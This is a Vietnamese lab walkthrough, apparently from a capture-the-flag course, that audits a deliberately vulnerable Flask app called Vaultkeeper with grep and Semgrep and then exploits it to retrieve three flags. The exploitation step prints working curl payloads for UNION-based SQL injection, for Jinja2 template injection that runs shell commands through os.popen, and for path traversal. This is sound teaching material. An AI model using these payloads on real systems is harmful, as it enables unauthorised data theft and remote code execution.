Đã đến lúc chạy toàn bộ phương pháp trên mục tiêu đã triển khai. Vaultkeeper là một công cụ lưu trữ thông tin xác thực nhỏ được viết bằng Flask, được cung cấp cho chúng tôi với quyền truy cập mã nguồn đầy đủ như một phần của hoạt động kiểm thử hộp xám. Chúng tôi có một phiên bản đang chạy tại `http://10.114.141.196:8080`, mã nguồn được mở trong trình xem tại `http://10.114.141.196`, và quyền truy cập SSH vào máy để chạy các công cụ. Cùng một thông tin đăng nhập, analyst/ vaultkeeper, được dùng để đăng nhập vào cả ứng dụng web và tài khoản xem xét SSH. Các tuyến web được xác thực cần phiên đó, vì vậy hãy đăng nhập trước. Nhiệm vụ của chúng tôi là lập bản đồ ứng dụng, phân loại nó, sau đó xác nhận và khai thác các phát hiện để lấy ba cờ.

## Bước 1: Lập bản đồ bề mặt tấn công

Kết nối SSH vào tài khoản xem xét trên máy đích, nơi nguồn và các công cụ đã được thiết lập sẵn, sau đó áp dụng thứ tự đọc của Nhiệm vụ 2. Chúng ta có thể đọc cùng các tệp đó trong trình xem trên trình duyệt khi `http://10.114.141.196`thực hiện.

```
$ ssh analyst@10.114.141.196        # password: vaultkeeper
analyst@thm:~$ cd ~/vaultkeeper
analyst@thm:~/vaultkeeper$ ls
app.py  config.py  init_db.py  requirements.txt  templates  uploads
```

Từ đó ~/vaultkeeper, mở tệp kê khai phụ thuộc, đọc `onfig.py`và liệt kê mọi mục @app.route. Chúng ta sẽ tìm kiếm các lỗi cấu hình trước, sau đó là các điểm truy cập đáng để kiểm tra:

```
$ grep -rnE "DEBUG\s*=\s*True|SECRET_KEY\s*=" --include="*.py" .
./config.py:6:SECRET_KEY = "vk_s3cr3t_d0_n0t_sh1p_2026"
./config.py:7:DEBUG = True
$ grep -rn "@app.route" --include="*.py" .
./app.py:50:@app.route("/")
./app.py:55:@app.route("/login", methods=["GET", "POST"])
./app.py:73:@app.route("/logout")
./app.py:79:@app.route("/search")
./app.py:105:@app.route("/vault/<int:item_id>")
./app.py:117:@app.route("/files/download")
```

Đến cuối bước này, chúng ta sẽ thấy các giá trị được mã hóa cứng `SECRET_KEY`và `DEBUG = True`trong config.py, cùng với danh sách tuyến đường bao gồm điểm cuối tìm kiếm ( /search), điểm cuối tải xuống tệp ( /files/download) và điểm cuối kho lưu trữ cho mỗi bản ghi ( /vault/<id>).

## Bước 2: Phân loại kết quả bằng Grep và Semgrep

Hãy tìm ra những lỗi nghiêm trọng và để Semgrep kiểm tra chéo:

```
$ grep -rn --include="*.py" -E "cursor\.execute|render_template_string|send_file|os\.path\.join" .
./init_db.py:13:DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vaultkeeper.db")
./app.py:12:    render_template_string,
./app.py:13:    send_file,
./app.py:22:DB_PATH = os.path.join(BASE_DIR, "vaultkeeper.db")
./app.py:23:UPLOAD_DIR = os.path.join(BASE_DIR, UPLOAD_DIRNAME)
./app.py:86:    heading = render_template_string("Results for: " + q) if q else ""
./app.py:93:        cursor.execute(
./app.py:121:    path = os.path.join(UPLOAD_DIR, filename)
./app.py:124:    return send_file(path)
$ semgrep --config /opt/review/semgrep-rules .

┌─────────────────┐
│ 4 Code Findings │
└─────────────────┘

    app.py
    ❯❱ opt.review.semgrep-rules.vk-ssti-render-template-string
          ❰❰ Blocking ❱❱
          render_template_string on possibly user-controlled input can allow server-side
          template injection (SSTI).

           86┆ heading = render_template_string("Results for: " + q) if q else ""

   ❯❯❱ opt.review.semgrep-rules.vk-sqli-fstring-execute
          ❰❰ Blocking ❱❱
          SQL query built with an f-string passed to execute(); use parameterised queries instead.

           93┆ cursor.execute(
           94┆     f"SELECT title, secret FROM vault WHERE owner_id = {uid} AND title LIKE '%{q}%'"
           95┆ )

   ❯❯❱ opt.review.semgrep-rules.vk-path-traversal-send-file
          ❰❰ Blocking ❱❱
          A path-joined or user-controlled value flows into send_file(); can allow path
          traversal. Prefer send_from_directory.

          124┆ return send_file(path)

    config.py
    ❯❱ opt.review.semgrep-rules.vk-hardcoded-secret
          ❰❰ Blocking ❱❱
          Hardcoded secret assigned in source; load it from the environment instead.

            6┆ SECRET_KEY = "vk_s3cr3t_d0_n0t_sh1p_2026"
```
Các kết quả tìm kiếm bằng grep bao gồm cả nhiễu (các dòng nhập khẩu, các `DB_PATH`phép nối), đó chính là điểm mấu chốt: một kết quả tìm kiếm bằng grep chỉ là một ứng viên, chứ không phải là một kết quả đã được tìm thấy. Semgrep thu hẹp kết quả xuống còn bốn kết quả quan trọng.

Máy này cung cấp Semgrep với một bộ quy tắc có sẵn tại `/opt/review/semgrep-rules`, vì vậy quá trình quét này chạy ngoại tuyến; nếu có truy cập internet, chúng ta sẽ trỏ `--config`đến một bộ quy tắc công khai như `p/owasp-top-ten`thay vào đó. Đọc từng kết quả tìm kiếm trong ngữ cảnh. Danh sách ứng viên sẽ thu hẹp lại thành một truy vấn SQL thô được xây dựng bằng chuỗi f trong trình xử lý tìm kiếm, cùng một trình xử lý đó sẽ phản hồi lại truy vấn thông qua `render_template_string`, và một trình xử lý tải xuống kết hợp đầu vào của người dùng với `send_file`.

## Bước 3: Xác nhận và khai thác

Kiểm tra ba trong số các phát hiện so với phiên bản đang chạy và lấy từng cờ. Chạy các lệnh này từ AttackBox chống lại `http://10.114.141.196:8080`, hoặc từ phiên SSH của chúng ta chống lại `http://localhost:8080`, cả hai đều truy cập được ứng dụng. Các cờ được hiển thị như `THM{...}`trong đầu ra bên dưới; phiên bản đang chạy sẽ in giá trị thực, hãy gửi giá trị đó.

Các tuyến tìm kiếm và tải xuống đang ở phía sau `@login_required`, vì vậy yêu cầu không có phiên sẽ bị trả về trang đăng nhập. Chúng ta đăng nhập một lần bằng `curl`, lưu cookie phiên vào một tệp `jar` và sử dụng lại nó với `-b jar`trong mọi yêu cầu sau này:

```
$ curl -s -c jar --data "username=analyst&password=vaultkeeper" "http://10.114.141.196:8080/login"
```

Lỗ hổng SQL injection trong điểm cuối tìm kiếm. Trình xử lý xây dựng truy vấn của nó bằng một chuỗi `f-string`, do đó tham số tìm kiếm có thể bị tấn công. Truy vấn lọc theo người dùng đã đăng nhập, vì vậy nó che giấu dữ liệu chúng ta muốn, nhưng đọc tập lệnh hạt giống ( `init_db.py`) cho thấy lược đồ: một `system_flags`bảng chứa cờ, và truy vấn chọn hai cột. Một truy `UNION`vấn có số lượng cột khớp sẽ lấy cờ ra ngay lập tức. Payload là ' `UNION SELECT flag, flag FROM system_flags-- -`: phần đầu 'đóng `title LIKE '%...`chuỗi mà trình xử lý đang lắp ráp, `UNION SELECT flag`, `flag`thêm một tập kết quả thứ hai có hai cột khớp với `title, secre`truy vấn gốc đã trả về (một truy vấn `UNION`cần có số lượng cột khớp), và phần cuối `-- -`bình luận phần còn lại `%'`để những gì còn lại là SQL hợp lệ:

```
$ curl -s -b jar --get "http://10.114.141.196:8080/search" --data-urlencode "q=' UNION SELECT flag, flag FROM system_flags-- -" | grep -oE 'THM\{[^}]+\}' | head -1
THM{...}        # FLAG1, submit this value as the answer
```

SSTI trong trình xử lý tìm kiếm. Trình xử lý tương tự sẽ phản hồi lại truy vấn của chúng ta thông qua `render_template_string`, vì vậy truy vấn được hiển thị dưới dạng mẫu Jinja2 thay vì hiển thị dưới dạng dữ liệu. Trước tiên, hãy xác nhận việc chèn bằng `{{7*7}}`, sau đó xây dựng tiện ích đã hứa trong Nhiệm vụ 5 từng bước một. `cycler`là một hàm trợ giúp mà Jinja2 luôn hiển thị trong mẫu; `cycler.__init__`là hàm tạo của nó, một hàm Python thông thường; `.__globals__`trên hàm đó là không gian tên toàn cục của mô-đun đã định nghĩa nó, `jinja2.utils`; mô-đun đó nhập os, vì vậy `cycler.__init__.__globals__.os`là osmô-đun được truy cập từ bên trong mẫu; và `.popen('printenv FLAG2').read()`chạy lệnh và trả về đầu ra của nó. Ứng dụng giữ `FLAG2`trong môi trường tiến trình của nó, vì vậy `printenv FLAG2`đọc lại nó:

```
$ curl -s -b jar --get "http://10.114.141.196:8080/search" --data-urlencode "q={{7*7}}" | grep -oE 'Results for: [0-9]+'
Results for: 49
$ curl -s -b jar --get "http://10.114.141.196:8080/search" --data-urlencode "q={{ cycler.__init__.__globals__.os.popen('printenv FLAG2').read() }}" | grep -oE 'THM\{[^}]+\}'
THM{...}        # FLAG2
```

Lỗi truy cập thư mục trái phép trong điểm cuối tải xuống. Trình xử lý nối tên tệp của chúng ta vào thư mục tải lên và gọi hàm `send_file`mà không kiểm tra tính hợp lệ. Thoát khỏi thư mục tải lên để đọc `/flag3.txt`:

```
$ curl -s -b jar "http://10.114.141.196:8080/files/download?file=../../../flag3.txt"
THM{...}        # FLAG3
```

Hai phát hiện mà chúng tôi chưa khai thác, đó là lỗi kiểm soát truy cập trên điểm cuối của Vault và mã được mã hóa cứng `SECRET_KEY`, đều là có thật và đáng được xác nhận trong ghi chú của chúng tôi. Vaultkeeper cũng không có lỗ hổng chèn lệnh hoặc lỗi giải mã dữ liệu không an toàn; một ứng dụng thực tế hiếm khi chứa tất cả các lớp mà chúng tôi đã nghiên cứu, và việc ghi lại những lớp nào bị thiếu là một phần của quá trình kiểm toán. Một báo cáo đầy đủ sẽ liệt kê mọi phát hiện, không chỉ những phát hiện tạo ra cảnh báo.
